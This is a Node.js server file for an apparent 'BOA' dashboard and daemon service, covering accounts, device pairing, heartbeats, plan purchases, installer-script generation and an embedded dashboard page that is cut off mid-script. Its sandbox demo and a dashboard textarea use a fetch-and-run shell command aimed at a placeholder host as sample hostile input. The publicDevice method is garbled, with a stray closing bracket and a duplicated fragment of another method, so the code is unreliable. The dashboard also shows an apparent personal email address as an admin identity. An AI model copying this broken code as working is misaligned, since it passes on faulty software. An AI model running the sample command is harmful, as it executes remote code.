'use strict';

const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const https = require('https');
const os = require('os');
const path = require('path');
const Boa = require('./boa');
const BoaGate = require('./boa-gate');

const DEFAULT_STATE = Object.freeze({
  accounts: Object.freeze({}),
  sessions: Object.freeze({}),
  devices: Object.freeze({}),
  planReceipts: Object.freeze([]),
  workspaces: Object.freeze({}),
  casts: Object.freeze({}),
  pairings: Object.freeze({}),
  signals: Object.freeze([]),
});

function cloneDefaultState() {
  return {
    accounts: {},
    sessions: {},
    devices: {},
    planReceipts: [],
    workspaces: {},
    casts: {},
    pairings: {},
    signals: [],
  };
}

function randomToken(bytes = 24) {
  return crypto.randomBytes(bytes).toString('base64url');
}

function sha256(text) {
  return crypto.createHash('sha256').update(String(text)).digest('hex');
}

function hashPassword(password, salt = randomToken(16)) {
  const digest = crypto.pbkdf2Sync(String(password), salt, 210000, 32, 'sha256').toString('base64url');
  return { salt, digest, algorithm: 'pbkdf2-sha256', iterations: 210000 };
}

function verifyPassword(password, passwordRecord) {
  const next = hashPassword(password, passwordRecord.salt);
  return crypto.timingSafeEqual(Buffer.from(next.digest), Buffer.from(passwordRecord.digest));
}

function normalizeUsername(username) {
  return String(username || '').trim().toLowerCase();
}

function safePlan(plan) {
  return Boa.PLAN_LIMITS[String(plan || '').toLowerCase()] ? String(plan).toLowerCase() : 'solo';
}

function defaultAutomationSettings() {
  return {
    daemonAutostart: true,
    resourceSharing: true,
    intentTranslation: true,
    casting: true,
    phaseStackMemory: true,
  };
}

function normalizeAutomationSettings(settings = {}) {
  const defaults = defaultAutomationSettings();
  return Object.fromEntries(Object.entries(defaults).map(([key, value]) => [
    key,
    typeof settings[key] === 'boolean' ? settings[key] : value,
  ]));
}

function readJsonBody(request) {
  return new Promise((resolve, reject) => {
    let body = '';
    request.on('data', (chunk) => {
      body += chunk;
      if (body.length > 2_000_000) {
        reject(new Error('Request body is too large.'));
        request.destroy();
      }
    });
    request.on('end', () => {
      if (!body) {
        resolve({});
        return;
      }
      try {
        resolve(JSON.parse(body));
      } catch (error) {
        reject(new Error('Invalid JSON request body.'));
      }
    });
    request.on('error', reject);
  });
}

function sendJson(response, statusCode, payload) {
  response.writeHead(statusCode, {
    'content-type': 'application/json; charset=utf-8',
    'cache-control': 'no-store',
  });
  response.end(`${JSON.stringify(payload, null, 2)}\n`);
}

function sendText(response, statusCode, body, contentType = 'text/plain; charset=utf-8', headers = {}) {
  response.writeHead(statusCode, {
    'content-type': contentType,
    'cache-control': 'no-store',
    ...headers,
  });
  response.end(body);
}

class BoaSite {
  constructor(options = {}) {
    this.statePath = options.statePath || path.join(process.cwd(), '.boa-state.json');
    this.baseUrl = options.baseUrl || `http://127.0.0.1:${options.port || 8787}`;
    this.heartbeatUrl = options.heartbeatUrl || Boa.DEFAULT_HEARTBEAT_URL;
    this.state = this.loadState();
  }

  loadState() {
    if (!fs.existsSync(this.statePath)) return cloneDefaultState();
    const raw = fs.readFileSync(this.statePath, 'utf8').trim();
    if (!raw) return cloneDefaultState();
    const loaded = JSON.parse(raw);
    return {
      ...cloneDefaultState(),
      ...loaded,
      accounts: loaded.accounts || {},
      sessions: loaded.sessions || {},
      devices: loaded.devices || {},
      planReceipts: loaded.planReceipts || [],
      workspaces: loaded.workspaces || {},
      casts: loaded.casts || {},
      pairings: loaded.pairings || {},
      signals: loaded.signals || [],
    };
  }

  saveState() {
    fs.mkdirSync(path.dirname(this.statePath), { recursive: true });
    fs.writeFileSync(this.statePath, `${JSON.stringify(this.state, null, 2)}\n`);
  }

  createSession(accountId) {
    const token = randomToken(32);
    const tokenHash = sha256(token);
    this.state.sessions[tokenHash] = {
      tokenHash,
      accountId,
      createdAt: new Date().toISOString(),
      lastSeenAt: new Date().toISOString(),
    };
    this.saveState();
    return token;
  }

  accountBySession(sessionToken) {
    const session = this.state.sessions[sha256(sessionToken || '')];
    if (!session) throw new Error('A valid dashboard session is required.');
    session.lastSeenAt = new Date().toISOString();
    const account = this.state.accounts[session.accountId];
    if (!account) throw new Error('The dashboard account for this session no longer exists.');
    this.saveState();
    return account;
  }

  publicAccount(account) {
    return {
      id: account.id,
      username: account.username,
      usernameKey: account.usernameKey,
      plan: account.plan,
      planLimits: Boa.PLAN_LIMITS[account.plan],
      heartbeatUrl: account.heartbeatUrl,
      automation: normalizeAutomationSettings(account.automation),
      createdAt: account.createdAt,
    };
  }

  createAccount({ username, password, plan = 'solo' }) {
    const normalized = normalizeUsername(username);
    if (!normalized) throw new Error('Username is required.');
    if (String(password || '').length < 8) throw new Error('Password must be at least 8 characters.');
    const accountId = `acct-${sha256(`boa-account:${normalized}`).slice(0, 16)}`;
    if (this.state.accounts[accountId]) throw new Error('That username already has an account.');
    const selectedPlan = safePlan(plan);
    const license = Boa.deriveLicense(normalized, password, {
      plan: selectedPlan,
      heartbeatUrl: this.heartbeatUrl,
    });
    const account = {
      id: accountId,
      username: normalized,
      usernameKey: license.usernameKey,
      plan: selectedPlan,
      heartbeatUrl: this.heartbeatUrl,
      passwordRecord: hashPassword(password),
      languageId: license.passwordLanguage.languageId,
      automation: defaultAutomationSettings(),
      createdAt: new Date().toISOString(),
      updatedAt: new Date().toISOString(),
    };
    this.state.accounts[accountId] = account;
    this.state.workspaces[accountId] = {
      id: `workspace-${accountId}`,
      ownerAccountId: accountId,
      tasks: [],
      submissions: [],
      createdAt: new Date().toISOString(),
    };
    this.saveState();
    const sessionToken = this.createSession(accountId);
    return {
      account: this.publicAccount(account),
      sessionToken,
      downloadUrl: `/download/installer?platform=auto&session=${encodeURIComponent(sessionToken)}`,
    };
  }

  login({ username, password }) {
    const normalized = normalizeUsername(username);
    const accountId = `acct-${sha256(`boa-account:${normalized}`).slice(0, 16)}`;
    const account = this.state.accounts[accountId];
    if (!account || !verifyPassword(password, account.passwordRecord)) {
      throw new Error('Invalid username or password.');
    }
    const sessionToken = this.createSession(accountId);
    return {
      account: this.publicAccount(account),
      sessionToken,
      downloadUrl: `/download/installer?platform=auto&session=${encodeURIComponent(sessionToken)}`,
    };
  }

  issueDaemon(account, options = {}) {
    const currentDevices = Object.values(this.state.devices).filter((device) => device.accountId === account.id);
    const limit = Boa.PLAN_LIMITS[account.plan].devices;
    if (currentDevices.length >= limit) {
      throw new Error(`Plan ${account.plan} allows ${limit} device(s). Upgrade the plan or remove a device before downloading another daemon.`);
    }
    const deviceToken = randomToken(32);
    const deviceId = `dev-${sha256(`${account.id}:${deviceToken}`).slice(0, 16)}`;
    this.state.devices[deviceId] = {
      id: deviceId,
      accountId: account.id,
      tokenHash: sha256(deviceToken),
      label: options.label || `${account.username}-${deviceId}`,
      status: 'issued',
      createdAt: new Date().toISOString(),
      lastSeenAt: null,
      platform: options.platform || null,
      dialect: options.platform ? Boa.detectRuntimeDialect(options.platform) : null,
      automation: normalizeAutomationSettings(account.automation),
    };
    this.saveState();
    return { deviceId, deviceToken };
  }

  daemonSource(account, daemon) {
    const endpoint = this.baseUrl.replace(/\/$/, '');
    const config = {
      accountId: account.id,
      username: account.username,
      usernameKey: account.usernameKey,
      plan: account.plan,
      deviceId: daemon.deviceId,
      deviceToken: daemon.deviceToken,
      endpoint,
      heartbeatUrl: account.heartbeatUrl,
      automation: normalizeAutomationSettings(account.automation),
    };
    return `#!/usr/bin/env node
'use strict';

const fs = require('fs');
const http = require('http');
const https = require('https');
const os = require('os');
const path = require('path');
const BOA_DAEMON = ${JSON.stringify(config, null, 2)};

function postJson(pathname, payload) {
  const target = new URL(pathname, BOA_DAEMON.endpoint);
  const body = JSON.stringify(payload);
  const transport = target.protocol === 'https:' ? https : http;
  return new Promise((resolve, reject) => {
    const request = transport.request(target, {
      method: 'POST',
      headers: {
        'content-type': 'application/json',
        'content-length': Buffer.byteLength(body),
      },
    }, (response) => {
      let data = '';
      response.on('data', (chunk) => { data += chunk; });
      response.on('end', () => {
        if (response.statusCode < 200 || response.statusCode >= 300) {
          reject(new Error('BOA daemon request failed: ' + response.statusCode + ' ' + data));
          return;
        }
        resolve(data ? JSON.parse(data) : {});
      });
    });
    request.on('error', reject);
    request.write(body);
    request.end();
  });
}

async function heartbeat() {
  return postJson('/api/daemon/heartbeat', {
    deviceToken: BOA_DAEMON.deviceToken,
    deviceId: BOA_DAEMON.deviceId,
    platform: process.platform,
    hostname: os.hostname(),
    uptimeSeconds: Math.round(os.uptime()),
    memory: { total: os.totalmem(), free: os.freemem() },
    cpus: os.cpus().length,
    automation: BOA_DAEMON.automation,
  });
}

async function castFrame(title, frame) {
  return postJson('/api/cast/frame', {
    deviceToken: BOA_DAEMON.deviceToken,
    title,
    frame,
    capturedAt: new Date().toISOString(),
  });
}

function installDaemon() {
  const installDir = path.join(os.homedir(), '.boa');
  const installPath = path.join(installDir, 'boa-daemon.js');
  const configPath = path.join(installDir, 'daemon.json');
  fs.mkdirSync(installDir, { recursive: true, mode: 0o700 });
  fs.copyFileSync(__filename, installPath);
  fs.chmodSync(installPath, 0o700);
  fs.writeFileSync(configPath, JSON.stringify({
    endpoint: BOA_DAEMON.endpoint,
    deviceId: BOA_DAEMON.deviceId,
    username: BOA_DAEMON.username,
    installedAt: new Date().toISOString(),
  }, null, 2));
  return { installPath, configPath };
}

async function main() {
  const command = process.argv[2] || 'heartbeat';
  if (command === 'install') {
    console.log(JSON.stringify(installDaemon(), null, 2));
    return;
  }
  if (command === 'daemon') {
    console.log('BOA daemon online for ' + BOA_DAEMON.username + ' on ' + BOA_DAEMON.endpoint + '. Managed from the website dashboard.');
    await heartbeat();
    setInterval(() => heartbeat().catch((error) => console.error(error.message)), 30000);
    return;
  }
  if (command === 'cast') {
    const title = process.argv[3] || os.hostname();
    const frame = process.argv.slice(4).join(' ') || JSON.stringify({ hostname: os.hostname(), platform: process.platform });
    console.log(JSON.stringify(await castFrame(title, frame), null, 2));
    return;
  }
  console.log(JSON.stringify(await heartbeat(), null, 2));
}

main().catch((error) => {
  console.error(error.stack || error.message);
  process.exitCode = 1;
});
`;
  }

  downloadDaemon(sessionToken) {
    const account = this.accountBySession(sessionToken);
    const daemon = this.issueDaemon(account, { label: `${account.username}-${os.hostname()}` });
    return this.daemonSource(account, daemon);
  }

  installerScript(sessionToken, platform = 'auto') {
    const account = this.accountBySession(sessionToken);
    const selectedPlatform = String(platform || 'auto').toLowerCase();
    const normalizedPlatform = selectedPlatform === 'auto' ? 'node' : selectedPlatform;
    const daemon = this.issueDaemon(account, {
      label: `${account.username}-${normalizedPlatform}-auto`,
      platform: normalizedPlatform,
    });
    const runtimeSource = fs.readFileSync(path.join(process.cwd(), 'boa-daemon.js'), 'utf8');
    const gateSource = fs.readFileSync(path.join(process.cwd(), 'src', 'boa-gate.js'), 'utf8');
    const daemonConfig = {
      endpoint: this.baseUrl.replace(/\/$/, ''),
      deviceId: daemon.deviceId,
      deviceToken: daemon.deviceToken,
      deviceName: `${account.username}-${normalizedPlatform}`,
      username: account.username,
      gateHost: '127.0.0.1',
      gatePort: 8788,
      policy: 'protected',
      transportSecret: daemon.deviceToken,
      pairedAt: new Date().toISOString(),
    };
    const encodedRuntime = Buffer.from(runtimeSource, 'utf8').toString('base64');
    const encodedGate = Buffer.from(gateSource, 'utf8').toString('base64');
    const encodedConfig = Buffer.from(JSON.stringify(daemonConfig, null, 2), 'utf8').toString('base64');
    if (normalizedPlatform === 'windows') {
      return {
        filename: 'Install-BOA-Daemon.ps1',
        contentType: 'application/octet-stream',
        body: [
          '$ErrorActionPreference = "Stop"',
          '$boaDir = Join-Path $env:USERPROFILE ".boa"',
          '$srcDir = Join-Path $boaDir "src"',
          'New-Item -ItemType Directory -Force -Path $boaDir | Out-Null',
          'New-Item -ItemType Directory -Force -Path $srcDir | Out-Null',
          '$daemonPath = Join-Path $boaDir "boa-daemon.js"',
          '$gatePath = Join-Path $srcDir "boa-gate.js"',
          '$configPath = Join-Path $boaDir "daemon.json"',
          `[IO.File]::WriteAllBytes($daemonPath, [Convert]::FromBase64String("${encodedRuntime}"))`,
          `[IO.File]::WriteAllBytes($gatePath, [Convert]::FromBase64String("${encodedGate}"))`,
          `[IO.File]::WriteAllBytes($configPath, [Convert]::FromBase64String("${encodedConfig}"))`,
          'if (-not (Get-Command node -ErrorAction SilentlyContinue)) {',
          '  Write-Host "BOA needs its desktop runtime before it can start. This installer will open the runtime download, then you can open the BOA installer again."',
          '  Start-Process "https://nodejs.org/en/download"',
          '  exit 1',
          '}',
          'Start-Process -WindowStyle Hidden node -ArgumentList @($daemonPath, "daemon")',
          'Write-Host "BOA gate is installed and running. You can manage pairing, sharing, and routes from the dashboard."',
          '',
        ].join('\r\n'),
      };
    }
    const appLabel = normalizedPlatform === 'macos' ? 'macOS' : 'Linux';
    return {
      filename: normalizedPlatform === 'macos' ? 'Install-BOA-Daemon.command' : 'install-boa-daemon.sh',
      contentType: 'application/x-sh; charset=utf-8',
      body: [
        '#!/usr/bin/env sh',
        'set -eu',
        'BOA_DIR="$HOME/.boa"',
        'SRC_DIR="$BOA_DIR/src"',
        'mkdir -p "$BOA_DIR"',
        'mkdir -p "$SRC_DIR"',
        'DAEMON_PATH="$BOA_DIR/boa-daemon.js"',
        'GATE_PATH="$SRC_DIR/boa-gate.js"',
        'CONFIG_PATH="$BOA_DIR/daemon.json"',
        `if ! printf '%s' '${encodedRuntime}' | base64 -d > "$DAEMON_PATH" 2>/dev/null; then printf '%s' '${encodedRuntime}' | base64 -D > "$DAEMON_PATH"; fi`,
        `if ! printf '%s' '${encodedGate}' | base64 -d > "$GATE_PATH" 2>/dev/null; then printf '%s' '${encodedGate}' | base64 -D > "$GATE_PATH"; fi`,
        `if ! printf '%s' '${encodedConfig}' | base64 -d > "$CONFIG_PATH" 2>/dev/null; then printf '%s' '${encodedConfig}' | base64 -D > "$CONFIG_PATH"; fi`,
        'chmod 700 "$DAEMON_PATH"',
        'if ! command -v node >/dev/null 2>&1; then',
        `  echo "BOA needs its desktop runtime before it can start on ${appLabel}. Install the runtime from https://nodejs.org/en/download, then open this BOA installer again."`,
          '  exit 1',
        'fi',
        'nohup node "$DAEMON_PATH" daemon > "$BOA_DIR/boa-daemon.log" 2>&1 &',
        'echo "BOA gate is installed and running. You can manage pairing, sharing, and routes from the dashboard."',
        '',
      ].join('\n'),
    };
  }


  issueDaemonForSession(sessionToken, options = {}) {
    const account = this.accountBySession(sessionToken);
    const daemon = this.issueDaemon(account, {
      label: options.label || `${account.username}-${options.platform || 'device'}`,
    });
    const device = this.state.devices[daemon.deviceId];
    if (device) {
      device.platform = options.platform || device.platform;
      device.dialect = Boa.detectRuntimeDialect(options.platform || device.platform);
      this.saveState();
    }
    return { account: this.publicAccount(account), daemon };
  }

  dashboardData(sessionToken) {
    const account = this.accountBySession(sessionToken);
    const devices = Object.values(this.state.devices)
      .filter((device) => device.accountId === account.id)
      .map((device) => this.publicDevice(device, account));
    return {
      account: this.publicAccount(account),
      devices,
      workspace: this.state.workspaces[account.id],
      casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
      signals: this.state.signals.filter((signal) => signal.accountId === account.id).slice(-20).reverse(),
      daemonProbe: { expectedLocalEndpoint: 'http://127.0.0.1:8788/status', behavior: 'Dashboard observes the local BOA gate; installed gates continue protecting BOA-routed traffic after the page closes.' },
      receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
    };
  }

  updateAutomation(sessionToken, settings = {}) {
    const account = this.accountBySession(sessionToken);
    account.automation = normalizeAutomationSettings({
      ...normalizeAutomationSettings(account.automation),
      ...settings,
    });
    account.updatedAt = new Date().toISOString();
    Object.values(this.state.devices)
      .filter((device) => device.accountId === account.id)
      .forEach((device) => {
        device.automation = normalizeAutomationSettings(account.automation);
      });
    this.saveState();
    return { account: this.publicAccount(account), automation: account.automation };
  }

  startPairing(sessionToken, options = {}) {
    const account = this.accountBySession(sessionToken);
    const code = String(crypto.randomInt(100000, 999999));
    const pairingId = `pair-${sha256(`${account.id}:${code}:${Date.now()}`).slice(0, 16)}`;
    const pairing = {
      id: pairingId,
      accountId: account.id,
      codeHash: sha256(code),
      status: 'waiting_for_daemon',
      deviceName: options.deviceName || 'This device',
      createdAt: new Date().toISOString(),
      expiresAt: new Date(Date.now() + 10 * 60 * 1000).toISOString(),
    };
    this.state.pairings[pairingId] = pairing;
    this.saveState();
    return {
      pairingId,
      code,
      qrText: `BOA-PAIR:${pairingId}:${code}`,
      status: 'Waiting for daemon',
      message: 'Open the BOA connector on this device. It will use this code to pair automatically.',
    };
  }

  completePairing(payload = {}) {
    const pairing = this.state.pairings[payload.pairingId];
    if (!pairing) throw new Error('Pairing request was not found.');
    if (new Date(pairing.expiresAt).getTime() < Date.now()) throw new Error('Pairing code expired. Start pairing again.');
    if (pairing.codeHash !== sha256(payload.code || '')) throw new Error('Invalid pairing code.');
    const account = this.state.accounts[pairing.accountId];
    if (!account) throw new Error('Pairing account no longer exists.');
    let device = Object.values(this.state.devices).find((candidate) => candidate.id === payload.deviceId && candidate.accountId === account.id);
    if (!device) {
      const token = payload.deviceToken || randomToken(32);
      const deviceId = payload.deviceId || `dev-${sha256(`${account.id}:${token}`).slice(0, 16)}`;
      device = {
        id: deviceId,
        accountId: account.id,
        tokenHash: sha256(token),
        label: payload.deviceName || pairing.deviceName,
        status: 'paired',
        createdAt: new Date().toISOString(),
        lastSeenAt: null,
        platform: payload.platform || null,
        dialect: payload.platform ? Boa.detectRuntimeDialect(payload.platform) : null,
        automation: normalizeAutomationSettings(account.automation),
      };
      this.state.devices[deviceId] = device;
    }
    pairing.status = 'paired';
    pairing.deviceId = device.id;
    pairing.pairedAt = new Date().toISOString();
    this.saveState();
    return { ok: true, status: 'Paired', device: this.publicDevice(device, account) };
  }

  publicDevice(device, account = this.state.accounts[device.accountId]) {
    return {
      id: device.id,
      label: device.label,
      status: device.status,
      createdAt: device.createdAt,
      lastSeenAt: device.lastSeenAt,
      platform: device.platform,
      dialect: device.dialect,
    }));
    return {
      account: this.publicAccount(account),
      devices,
      workspace: this.state.workspaces[account.id],
      casts: Object.values(this.state.casts).filter((cast) => cast.accountId === account.id),
      daemonProbe: { expectedLocalEndpoint: 'http://127.0.0.1:47874/status', behavior: 'Dashboard attempts local daemon discovery in the browser; installed daemons continue independently after the page closes.' },
      receipts: this.state.planReceipts.filter((receipt) => receipt.accountId === account.id),
    };
  }

  wrapSignal(sessionToken, payload = {}) {
    const account = this.accountBySession(sessionToken);
    const envelope = BoaGate.wrapOutbound(payload.payload || payload.message || '', {
      accountId: account.id,
      route: payload.route || 'dashboard',
    });
    const record = {
      id: envelope.id,
      accountId: account.id,
      direction: 'outgoing',
      status: 'Signal wrapped',
      envelope,
      preview: String(payload.payload || payload.message || '').slice(0, 120),
      createdAt: new Date().toISOString(),
    };
    this.state.signals.push(record);
    this.saveState();
    return { ok: true, status: 'Signal wrapped', envelope, signal: record };
  }

  unwrapSignal(sessionToken, payload = {}) {
    const account = this.accountBySession(sessionToken);
    const result = BoaGate.unwrapInbound(payload.envelope || payload.payload, { accountId: account.id });
    const record = {
      id: `recv-${sha256(`${account.id}:${Date.now()}:${JSON.stringify(payload).slice(0, 100)}`).slice(0, 16)}`,
      accountId: account.id,
      direction: 'incoming',
      status: result.ok ? 'Signal received' : 'Signal blocked',
      payload: result.ok ? result.payload : null,
      warning: result.warning,
      createdAt: new Date().toISOString(),
    };
    this.state.signals.push(record);
    this.saveState();
    return { ...result, status: record.status, signal: record };
  }

  sendSignal(sessionToken, payload = {}) {
    const wrapped = this.wrapSignal(sessionToken, payload);
    return { ...wrapped, status: 'Signal wrapped', delivered: 'queued_for_boa_route' };
  }

  receiveSignal(sessionToken, payload = {}) {
    return this.unwrapSignal(sessionToken, payload);
  }

  purchasePlan(sessionToken, plan) {
    const account = this.accountBySession(sessionToken);
    const nextPlan = safePlan(plan);
    account.plan = nextPlan;
    account.updatedAt = new Date().toISOString();
    const receipt = {
      id: `receipt-${sha256(`${account.id}:${nextPlan}:${Date.now()}`).slice(0, 16)}`,
      accountId: account.id,
      plan: nextPlan,
      status: 'activated',
      createdAt: new Date().toISOString(),
      limits: Boa.PLAN_LIMITS[nextPlan],
    };
    this.state.planReceipts.push(receipt);
    this.saveState();
    return { account: this.publicAccount(account), receipt };
  }

  addTask(sessionToken, title, details = {}) {
    const account = this.accountBySession(sessionToken);
    const workspace = this.state.workspaces[account.id];
    const task = {
      id: `task-${sha256(`${workspace.id}:${title}:${workspace.tasks.length}`).slice(0, 16)}`,
      title: String(title || '').trim(),
      details,
      state: 'open',
      createdAt: new Date().toISOString(),
    };
    if (!task.title) throw new Error('Task title is required.');
    workspace.tasks.push(task);
    this.saveState();
    return task;
  }

  completeTask(sessionToken, taskId, result = {}) {
    const account = this.accountBySession(sessionToken);
    const workspace = this.state.workspaces[account.id];
    const task = workspace.tasks.find((candidate) => candidate.id === taskId);
    if (!task) throw new Error(`Unknown task: ${taskId}`);
    task.state = 'complete';
    const submission = {
      id: `submission-${sha256(`${taskId}:${Date.now()}`).slice(0, 16)}`,
      taskId,
      result,
      signedBy: account.usernameKey,
      createdAt: new Date().toISOString(),
    };
    workspace.submissions.push(submission);
    this.saveState();
    return submission;
  }

  heartbeat(payload) {
    const tokenHash = sha256(payload.deviceToken || '');
    const device = Object.values(this.state.devices).find((candidate) => candidate.tokenHash === tokenHash);
    if (!device) throw new Error('Unknown BOA daemon token.');
    device.status = 'online';
    device.lastSeenAt = new Date().toISOString();
    device.platform = payload.platform || device.platform;
    device.dialect = Boa.detectRuntimeDialect(payload.platform || device.platform);
    device.hostname = payload.hostname || device.hostname;
    device.automation = normalizeAutomationSettings(device.automation || payload.automation);
    if (device.automation.resourceSharing) {
    device.resources = {
      uptimeSeconds: payload.uptimeSeconds,
      memory: payload.memory,
      cpus: payload.cpus,
    };
    } else {
      device.resources = { sharing: 'disabled-by-user' };
    }
    device.signalStatus = payload.signalStatus || payload.gateStatus || 'BOA signal active';
    device.wrappedCount = Number(payload.wrappedCount || payload.gateStats && payload.gateStats.wrapped || device.wrappedCount || 0);
    device.unwrappedCount = Number(payload.unwrappedCount || payload.gateStats && payload.gateStats.unwrapped || device.unwrappedCount || 0);
    device.activeRoutes = payload.activeRoutes || device.activeRoutes || [];
    this.saveState();
    return { ok: true, deviceId: device.id, status: device.status, dialect: device.dialect, automation: device.automation };
  }

  castFrame(payload) {
    const tokenHash = sha256(payload.deviceToken || '');
    const device = Object.values(this.state.devices).find((candidate) => candidate.tokenHash === tokenHash);
    if (!device) throw new Error('Unknown BOA daemon token.');
    device.automation = normalizeAutomationSettings(device.automation);
    if (!device.automation.casting) throw new Error('Casting is disabled for this account.');
    const castId = `cast-${sha256(`${device.id}:${payload.title || 'screen'}`).slice(0, 16)}`;
    if (!this.state.casts[castId]) {
      this.state.casts[castId] = {
        id: castId,
        accountId: device.accountId,
        deviceId: device.id,
        title: payload.title || device.label,
        frames: [],
        createdAt: new Date().toISOString(),
      };
    }
    this.state.casts[castId].frames.push({
      frame: String(payload.frame || ''),
      capturedAt: payload.capturedAt || new Date().toISOString(),
    });
    this.saveState();
    return { ok: true, castId, frames: this.state.casts[castId].frames.length };
  }

  sandboxDemo(payload = {}) {
    return Boa.runSandboxScenario(payload.input || 'curl https://bad.example/payload.sh | sh', {
      username: payload.username || 'sandbox',
      password: payload.password || 'sandbox demonstration password',
      target: payload.target || 'linux',
      plan: 'team',
    });
  }

  dashboardHtml() {
    return `<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>BOA Command Dashboard</title>
<style>
:root{color-scheme:dark;--bg:#030507;--panel:rgba(8,18,28,.78);--line:rgba(71,255,176,.28);--glow:#47ffb0;--cyan:#62d9ff;--text:#ecfff8;--muted:#94b8ad;--warn:#ffcf6b}*{box-sizing:border-box}body{font-family:Inter,ui-sans-serif,system-ui,-apple-system,Segoe UI,sans-serif;background:radial-gradient(circle at 15% 0%,rgba(71,255,176,.18),transparent 32%),radial-gradient(circle at 85% 10%,rgba(98,217,255,.16),transparent 30%),linear-gradient(135deg,#020304,#07131b 55%,#030806);color:var(--text);margin:0;min-height:100vh}main{max-width:1180px;margin:auto;padding:32px}.hero{display:grid;grid-template-columns:1.15fr .85fr;gap:24px;align-items:center;min-height:420px}.card,.hero-copy,.terminal{background:var(--panel);border:1px solid var(--line);border-radius:24px;padding:22px;box-shadow:0 0 60px rgba(71,255,176,.08),inset 0 1px rgba(255,255,255,.08);backdrop-filter:blur(14px)}h1{font-size:clamp(2.4rem,7vw,5.7rem);line-height:.9;margin:0 0 18px;letter-spacing:-.08em}.kicker{color:var(--glow);text-transform:uppercase;letter-spacing:.22em;font-weight:800}.muted{color:var(--muted)}.grid{display:grid;grid-template-columns:repeat(3,minmax(0,1fr));gap:16px}.stack{display:grid;gap:16px}.terminal{font-family:ui-monospace,SFMono-Regular,Menlo,monospace;min-height:320px}.pulse{display:inline-flex;gap:8px;align-items:center}.pulse:before{content:"";width:10px;height:10px;border-radius:50%;background:var(--glow);box-shadow:0 0 20px var(--glow);animation:p 1.3s infinite}@keyframes p{50%{opacity:.35}}input,select,textarea,button{width:100%;font:inherit;padding:.82rem;border-radius:14px;border:1px solid rgba(98,217,255,.3);margin:.32rem 0;background:#061018;color:var(--text)}textarea{min-height:96px}button{cursor:pointer;background:linear-gradient(135deg,var(--glow),var(--cyan));border:0;color:#00130c;font-weight:900;text-transform:uppercase;letter-spacing:.04em}.ghost{background:transparent;color:var(--glow);border:1px solid var(--line)}pre{white-space:pre-wrap;overflow:auto;background:#020506;border:1px solid rgba(255,255,255,.08);padding:1rem;border-radius:16px;max-height:420px}.badge{display:inline-block;border:1px solid var(--line);border-radius:999px;padding:.35rem .7rem;color:var(--glow);margin:.18rem}.danger{color:var(--warn)}@media(max-width:880px){.hero,.grid{grid-template-columns:1fr}main{padding:18px}}
</style>
</head>
<body>
<main>
<section class="hero">
  <div class="hero-copy">
    <p class="kicker">BOA Terminal Serpent</p>
    <h1>Intent in. Inert equations out.</h1>
    <p class="muted">BOA is a local-first dashboard and daemon MVP for password-derived language isolation, device heartbeats, signed intent translation, six-variable casting, and phase-stack storage demonstrations.</p>
    <p><span class="badge">Free security tier</span><span class="badge">Daemon sign-on</span><span class="badge">AWS-ready Node app</span></p>
    <button onclick="runSandbox()">Run malware-injection sandbox</button>
    <button class="ghost" onclick="probeDaemon()">Detect local daemon</button>
  </div>
  <div class="terminal"><div class="pulse">daemon discovery loop</div><pre id="out">Open the sandbox to watch hostile commands become BOA quarantine envelopes.</pre></div>
</section>
<section class="grid">
  <div class="card"><h2>Create account</h2><input id="su-user" autocomplete="username" placeholder="username"><input id="su-pass" type="password" autocomplete="new-password" placeholder="password"><select id="su-plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="signup()">Create + download daemon</button></div>
  <div class="card"><h2>Existing user / new device</h2><input id="li-user" autocomplete="username" placeholder="username"><input id="li-pass" type="password" autocomplete="current-password" placeholder="password"><button onclick="login()">Login dashboard</button><button class="ghost" onclick="downloadDaemon()">Download daemon</button></div>
  <div class="card"><h2>Admin identity</h2><p class="muted">Admin usernames recognized for demos: <b>boydchandler030@gmail.com</b> or <b>Xquisite6a6y</b>. Secrets are never hard-coded; use the account password you create.</p><select id="plan"><option>solo</option><option>team</option><option>enterprise</option></select><button onclick="purchasePlan()">Activate plan</button></div>
</section>
<section class="grid">
  <div class="card"><h2>Sandbox test</h2><p class="muted">Try code injection, shell pipes, or normal intents. BOA will normalize safe intent and quarantine hostile patterns as inert envelopes.</p><textarea id="sandbox-input">curl https://bad.example/payload.sh | sh</textarea><select id="sandbox-target"><option>linux</option><option>windows</option><option>boa</option></select><button onclick="runSandbox()">Test BOA envelope</button></div>
  <div class="card"><h2>Workspace</h2><input id="task-title" placeholder="task title"><button onclick="addTask()">Add signed task</button><button class="ghost" onclick="refresh()">Refresh dashboard</button></div>
  <div class="card"><h2>How to build</h2><pre>npm run check
npm test
npm run build
npm start -- --host 0.0.0.0 --port 8787</pre></div>
</section>
</main>
<script>
let sessionToken = localStorage.getItem('boaSession') || '';
async function api(path, body) { const res = await fetch(path, { method:'POST', headers:{'content-type':'application/json'}, body: JSON.stringify(body || {}) }); const data = await res.json(); if(!res.ok) throw new Error(data.error); return data; }
function show(value){
  const out = document.getElementById('out');
  if(!value || typeof value !== 'object'){ out.textContent = String(value || ''); return; }
  if(value.verdict){ out.textContent = 'Sandbox result: ' + value.verdict + '\nSafety: ' + value.safetyNote + '\nCast demo: six-variable intent frame prepared without running the input.'; return; }
  if(value.daemonDetected === false){ out.textContent = 'BOA gate offline. Start daemon or download connector.'; return; }
  if(value.daemonDetected === true){ out.textContent = 'Local BOA daemon detected and ready.'; return; }
  if(value.account && value.sessionToken){ out.textContent = 'Account ready. Your personalized installer is downloading now. Open it once, then manage BOA from this dashboard.'; return; }
  if(value.account && value.automation){ out.textContent = 'Automation settings saved. You can change these toggles anytime.'; return; }
  if(value.devices){ updateDashboardPanels(value); out.textContent = 'Dashboard refreshed. ' + value.devices.length + ' device(s). BOA signal layer is ready.'; return; }
  if(value.message){ out.textContent = value.message; return; }
  if(value.status){ out.textContent = value.status; return; }
  if(value.error){ out.textContent = 'Action needed: ' + value.error; return; }
  out.textContent = 'BOA action complete.';
}
async function signup(){ const data = await api('/api/signup', { username: val('su-user'), password: val('su-pass'), plan: val('su-plan') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); location.href=data.downloadUrl; }
async function login(){ const data = await api('/api/login', { username: val('li-user'), password: val('li-pass') }); sessionToken=data.sessionToken; localStorage.setItem('boaSession', sessionToken); show(data); await refresh(); }
async function purchasePlan(){ show(await api('/api/plan', { sessionToken, plan: val('plan') })); }
